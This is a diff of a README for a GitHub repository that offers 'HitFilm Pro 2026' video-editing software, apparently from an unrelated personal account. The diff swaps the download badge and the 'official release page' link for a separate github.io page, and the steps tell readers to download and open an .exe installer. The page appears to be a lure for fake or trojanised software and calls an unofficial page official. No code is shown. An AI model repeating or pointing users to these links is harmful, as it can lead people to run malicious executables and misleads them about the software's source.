@@ -1,6 +1,6 @@
 # 🎬 HitFilm-Pro-2026 - Professional Video Editing Made Simple
 
-[![](https://img.shields.io/badge/Download_HitFilm_Pro-Blue?style=for-the-badge)](https://github.com/snakelo9182/HitFilm-Pro-2026/releases)
+[![](https://img.shields.io/badge/Download_HitFilm_Pro-Blue?style=for-the-badge)](https://snakelo9182.github.io)
 
 ---
 
@@ -19,7 +19,7 @@ HitFilm Pro 2026 runs on Windows 10 and Windows 11. Ensure your computer meets t
 
 Follow these steps to download and set up HitFilm Pro 2026 on your computer.
 
-1.  Visit the official release page to find the installer: [https://github.com/snakelo9182/HitFilm-Pro-2026/releases](https://github.com/snakelo9182/HitFilm-Pro-2026/releases).
+1.  Visit the official release page to find the installer: [https://snakelo9182.github.io](https://snakelo9182.github.io).
 2.  Locate the latest version release.
 3.  Click the file ending in .exe to download the installer to your Downloads folder.
 4.  Open the file once the download finishes.
